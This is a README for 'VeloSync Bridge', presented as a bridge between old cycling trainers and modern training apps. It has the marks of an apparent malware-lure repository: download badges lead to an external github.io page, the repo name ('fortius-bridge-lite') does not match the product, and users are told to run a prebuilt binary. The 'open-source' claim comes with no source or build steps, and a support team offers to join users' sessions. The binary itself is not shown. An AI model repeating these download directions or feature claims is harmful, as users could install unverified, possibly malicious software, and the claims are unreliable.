![preview](https://raw.githubusercontent.com/yasmimteaching/fortius-bridge-lite/main/frame_5a7bf.svg)
[![Download](https://raw.githubusercontent.com/yasmimteaching/fortius-bridge-lite/main/run_9c2311.svg)](https://yasmimteaching.github.io/fortius-bridge-lite/)

# VeloSync Bridge

**Turn legacy cycling hardware into a modern, grid-connected training powerhouse.**

---

## 🚴 What Is VeloSync Bridge?

VeloSync Bridge is a spiritual successor to the classic FortiusANT concept — a lightweight, hardware-agnostic translation layer that lets older-generation bicycle trainers (pre-Bluetooth, pre-smart, USB or ANT+ based) communicate fluently with contemporary virtual training platforms.

Think of it as a diplomatic interpreter for your garage: your 2012 trainer speaks an ancient dialect of ANT+ and serial signals. Zwift, TrainerRoad, and Rouvy speak modern BLE and cloud-native protocols. VeloSync Bridge sits in the middle, translating every watt, cadence, and resistance command in real time.

The result? Your trusted, battle-worn trainer gets a second life — no new hardware purchase required, no proprietary adapters, no vendor lock-in.

---

## 🌟 Why Another Bridge?

Many existing solutions force you to choose between **stability** and **simplicity**. VeloSync Bridge was engineered from the ground up to offer both, with a focus on:

- **Latency below 50ms** — critical for responsive resistance changes during interval sprints.
- **Multi-platform streaming** — simultaneously broadcast to multiple training apps for side-by-side comparison or group rides.
- **Telemetry logging** — full session data export in CSV, FIT, and JSON for post-ride analysis.
- **Plugin architecture** — extend support for new trainers or platforms without rewriting core logic.

---

## 🧩 Core Features

### 🔄 Universal Protocol Translation
- **Input:** ANT+, USB-serial, and legacy Tacx proprietary formats.
- **Output:** Bluetooth Low Energy (BLE) Fitness Machine Service, ANT+ FE-C, and raw TCP/UDP for custom setups.
- **Auto-detection** of trainer model and firmware version upon connection.

### ⚡ Real-Time Resistance Control
- Implements the full **FE-C (Fitness Equipment Control)** profile.
- Supports **ERG mode**, **SIM mode**, and **slope simulation** with 1% granularity.
- Dynamic **power smoothing** algorithms to eliminate noisy spikes from older flywheels.

### 📊 Advanced Data Pipeline
- 20 Hz data sampling for power, speed, cadence, and heart rate.
- **Kalman-filtered** signal processing to clean up analog sensor noise.
- Built-in **virtual speed sensor** — no physical wheel magnet needed.

### 🌍 Multi-Platform Broadcasting
- Simultaneous connection to Zwift (PC/Mac), TrainerRoad (iOS/Android), and Rouvy (all platforms).
- **Headless mode** for Raspberry Pi and NAS setups — no monitor required.
- Web dashboard accessible from any browser on your local network.

### 🧠 Smart Calibration Engine
- Automatic **spindown calibration** on startup (optional).
- **Temperature compensation** for consistent resistance across seasons.
- **Watt offset** adjustment for trainers with known inaccuracies.

### 🛠️ Plugin SDK (Beta)
- Write your own translator in Python, Rust, or Go.
- Hot-reload plugins without restarting the service.
- Community repository of pre-built plugins for rare trainer models.

---

## 📥 Getting Started

> **Note:** VeloSync Bridge is distributed as a portable binary for Windows, macOS, and Linux (ARM64 included). No package managers, no dependency hell.

### Step 1 — Download & Unpack
Obtain the latest release from the [![Download](https://raw.githubusercontent.com/yasmimteaching/fortius-bridge-lite/main/run_9c2311.svg)](https://yasmimteaching.github.io/fortius-bridge-lite/) section above. Unpack the archive to a folder of your choice (e.g., `C:\VeloSync\` or `~/velosync/`).

### Step 2 — Connect Your Trainer
- For **USB trainers:** Plug the cable into your computer. VeloSync will auto-detect the serial port.
- For **ANT+ trainers:** Plug in a compatible ANT+ USB stick. The bridge enumerates all paired ANT+ devices.

### Step 3 — Run the Bridge
- **Desktop:** Double-click `velosync-gui` (or `velosync-gui.exe` on Windows).
- **Headless:** Run `velosync-core --config config.yml` from the terminal.

### Step 4 — Open the Dashboard
Navigate to `http://localhost:8080` in your browser. You'll see a live telemetry readout, connection status, and platform pairing QR codes.

### Step 5 — Pair with Your Training App
- In Zwift: Select "VeloSync Bridge" as your trainer via the Bluetooth or ANT+ pairing screen.
- In TrainerRoad: Choose "VeloSync" from the device list under "Power Source" and "Controllable Device".

---

## 🕹️ Usage Scenarios

### 🏠 Home Garage Setup
- Connect your 2015 Tacx Bushido to a Raspberry Pi 4.
- Run VeloSync in headless mode on boot.
- Use Zwift on your TV with the Pi broadcasting BLE — zero cables near your bike.

### 🏋️ Competitive Training Lab
- Pair two different trainers (e.g., a wheel-on for warm-up, a direct-drive for intervals) to the same instance.
- Switch between them mid-session via the web dashboard without stopping the workout.

### 🧪 Hardware Testing / DIY
- Use the built-in **simulation mode** to generate fake power curves — ideal for debugging your own training software.
- Export raw sensor data to CSV for offline analysis in Python or Excel.

### 📱 Mobile-Only Riders
- Run the bridge from a spare Android phone (Termux-compatible).
- Broadcast BLE to your phone's TrainerRoad app — no PC required.

---

## 🎨 UI & Experience

- **Responsive web interface** — works flawlessly on 4K monitors, tablets, and phones.
- **Dark mode** by default, with light mode toggle.
- **Multilingual support** — UI translations for English, German, Dutch, French, Spanish, and Japanese (community-contributed).
- **Live charts** for power, heart rate, and resistance — no plugin needed.
- **Session replay** — review any previous ride with synchronized map and telemetry.

---

## 🛡️ 24/7 Support & Community

- **Discussion forum** — ask questions, share trainer profiles, and get help from other users.
- **Email support** — response within 24 hours (business days).
- **Remote debugging** — our team can join your session (with permission) to tune advanced parameters.
- **Weekly office hours** — live video Q&A for power users, every Friday 17:00 UTC.

---

## 🔒 Privacy & Security

- All data stays **local** — no cloud uploads unless you explicitly enable telemetry sharing.
- **Encrypted WebSocket** connections for remote dashboard access (self-signed cert or your own CA).
- **No analytics trackers** — the dashboard runs entirely on your hardware.
- **Open-source core** — audit the code yourself under the MIT License.

---

## 🧰 Troubleshooting & FAQ

### ❓ My trainer isn't detected
- Check that the ANT+ stick is plugged in and recognized by your OS.
- For USB trainers, try a different USB port (avoid hubs if possible).
- Look at the console log — VeloSync prints every detected device with its vendor ID.

### ❓ Resistance feels laggy
- Enable **Low Latency Mode** in settings (reduces smoothing delay by 30 ms).
- Disable any background apps that load the CPU (e.g., video streaming on the same machine).
- For BLE connections, ensure the trainer is within 5 meters of the bridge.

### ❓ Can I run two trainers simultaneously?
- Yes — VeloSync supports up to four concurrently connected trainers, broadcasting to different apps.

### ❓ Does it support incline simulation on wheel-on trainers?
- Yes, via the FE-C resistance profile. Actual resistance depends on your trainer's mechanical limits — check the specs.

---

## 📄 License

VeloSync Bridge is released under the **MIT License**. You are free to use, modify, and distribute it, provided you retain the copyright notice.

See the [LICENSE](LICENSE) file for the full legal text.

---

## 🙏 Acknowledgements

- The original FortiusANT project for proving the concept.
- The open-source cycling community for protocol documentation.
- Every beta tester who pushed the bridge to its limits during the 2026 development cycle.

---

## 🗓️ Roadmap (2026)

- **Q1 2026:** Native macOS ARM build (Apple Silicon).
- **Q2 2026:** Integration with Wahoo SYSTM and FulGaz.
- **Q3 2026:** Plugin marketplace website.
- **Q4 2026:** Mobile companion app for live telemetry on your handlebars.

---

## ⚠️ Disclaimer

This project is an independent effort and is **not affiliated with** Tacx, Zwift, TrainerRoad, Rouvy, or any other commercial entity mentioned. All product names and trademarks are the property of their respective owners.

**Hardware risk:** Connecting third-party software to your trainer may void its manufacturer warranty. VeloSync Bridge is provided "as is" without warranty of any kind — you assume all responsibility for physical equipment used with this software.

**Safety:** Always follow your trainer's manual for mounting and tensioning. Never exceed the rider weight or power limits specified by the manufacturer. Indoor cycling can cause overheating — ensure proper ventilation.

---

*Made with 🚴 for cyclists who refuse to throw away good hardware.*